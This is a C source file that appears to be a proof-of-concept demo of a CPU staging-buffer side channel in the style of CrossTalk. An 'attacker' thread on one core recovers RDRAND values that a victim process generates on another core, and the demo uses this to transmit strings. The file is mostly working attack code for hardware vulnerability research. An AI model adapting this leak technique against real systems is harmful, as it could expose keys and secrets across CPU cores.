#include "../primitives/basic_primitives.h"
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include "utils.h"
#include <string.h>


#define CYCLE_LENGTH (uint64_t)600000

// cpu_byte_0 = first byte of CPUID brand string 1
// thermal_byte_0 = same byte in the staging buffer, but contains the value after executing cpuid with leaf 0x6
uint8_t cpu_byte_0, thermal_byte_0;

void attacker_write_char(int cpu) {
    set_processor_affinity(cpu);

    char *leak_candidate_string = sample_strings[rand() % sample_string_count];
    int leak_pos = 0, len = strlen(leak_candidate_string);
    printf("[\e[32mWRITER/VICTIM\e[39m] Writing '%s'\n", leak_candidate_string + 1);
    do {
        usleep(CYCLE_LENGTH);
        uint64_t random_number = 0;
        while (((char) random_number) != leak_candidate_string[leak_pos])
                asm volatile("rdrand %0":"=r"(random_number):);
    } while (leak_pos++ < len);
    while (1) asm volatile("rdrand %%rax":: :"rax");
}

void synchronize_timing_with_writer(void *mem) {
    char staging_buffer[65];
    vector_read(mem, REPS * 5, staging_buffer, 32, 33, 0);
    uint8_t random_number = (uint8_t) staging_buffer[32];
    uint8_t reference = random_number;
    while (random_number == reference) {
        usleep(1000);
        vector_read(mem, REPS * 5, staging_buffer, 32, 33, 0);
        random_number = (uint8_t) staging_buffer[32];
    }

}

void attacker_read_char(int cpu, void *mem) {
    set_processor_affinity(cpu);
    asm volatile("rdrand %%rax":: :"rax");
    char staging_buffer[65];
    staging_buffer[64] = 0;

    struct timespec spec;
    uint64_t t;
    printf("[\e[31mREADER/ATTACKER\e[39m] ");
#ifdef TSX_AVAILABLE
    synchronize_timing_with_writer(mem);
#endif
    clock_gettime(CLOCK_REALTIME, &spec);
    t = time_convert(&spec);
    while (1) {
        while (time_convert(&spec) - t < (CYCLE_LENGTH * (uint64_t) 1000)) {
            clock_gettime(CLOCK_REALTIME, &spec);
        }
        clock_gettime(CLOCK_REALTIME, &spec);
        t = time_convert(&spec);
        uint64_t random_number = 0;
        vector_read(mem, REPS * 5, staging_buffer, 32, 33, 0);
        random_number = (uint8_t) staging_buffer[32];
#ifdef TSX_AVAILABLE
        if(random_number >= 128) break;
#else
        if (random_number == '*') break;
#endif
        printf("%c", (char) random_number);
        fflush(stdout);
    }
    printf("\nDone.\n");
}

int main(int argc, char **args) {
    printf("Demo 3: Transmitting strings across cores.\n\n");
    _page_size = getpagesize();
    get_same_core_cpus(&reader_cpu, &writer_cpu);
    offcore_cpu = reader_cpu + 1;
    printf("Running attacker threads on CPU %d and %d.\nRunning victim on CPU %d.\n\n", reader_cpu, writer_cpu,
           offcore_cpu);
    fflush(stdout);
    time_t tm;
    time(&tm);
    srand(tm);
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    crosstalk_init(argc, args);
    memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
    byte_32 = prime_and_get_cpuid(CPUID_BRAND_STRING_3_PRIMITIVE);
    cpu_byte_0 = prime_and_get_cpuid(CPUID_BRAND_STRING_1_PRIMITIVE);
    thermal_byte_0 = prime_and_get_cpuid(CPUID_THERMAL_STRING_PRIMITIVE);
    pid = fork();
    if (!pid) victim_cpuid(0xABCDEF, writer_cpu);
    pid2 = fork();
    if (!pid2) attacker_write_char(offcore_cpu);
    attacker_read_char(reader_cpu, mem);
    kill(pid2, SIGKILL);
    kill(pid, SIGKILL);
    munmap(mem - 1, _page_size * 257);
    usleep(10000);
    crosstalk_cleanup();
    return 0;
}

